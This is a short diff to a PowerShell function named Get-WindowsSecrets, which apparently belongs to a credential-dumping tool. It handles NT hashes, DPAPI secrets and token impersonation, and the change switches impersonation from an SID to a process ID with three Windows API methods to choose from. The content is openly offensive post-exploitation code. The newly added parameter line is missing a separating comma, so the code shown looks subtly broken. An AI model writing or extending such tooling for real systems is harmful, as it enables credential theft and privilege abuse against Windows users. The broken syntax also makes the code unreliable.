@@ -10361,7 +10361,8 @@ function Get-WindowsSecrets()
 		[Parameter(Mandatory=$False)][String]$Creds,	# Format = <UserName1>:<Pwd1>/<UserName2>@<Domain>:<Pwd2>/...
 		[Parameter(Mandatory=$False)][String]$NTHashes,	# Format = <UserName1>:<HexNTH1>/<UserName2>@<Domain>:<HexNTH2>/...
 		[Parameter(Mandatory=$False)][Boolean]$SkipDPAPI,
-		[Parameter(Mandatory=$False)][String]$ImpersonateToken # Format = <SID>
+		[Parameter(Mandatory=$False)][String]$ImpersonateTokenProcID # Format = <ProcID>
+		[Parameter(Mandatory=$False)][String]$Method # Possible values = "ImpersonateLoggedOnUser" | "CreateProcessWithToken" | "CreateProcessAsUser"
 		)
 
 	# Check administrator privileges, otherwise exit
@@ -10372,10 +10373,9 @@ function Get-WindowsSecrets()
 		Exit
 	}
 
-	If ($ImpersonateToken)
+	If ($ImpersonateTokenProcID)
 	{
-		$SID = $ImpersonateToken
-		ImpersonateToken $SID
+		ImpersonateToken $ImpersonateTokenProcID $Method
 
 		return
 	}
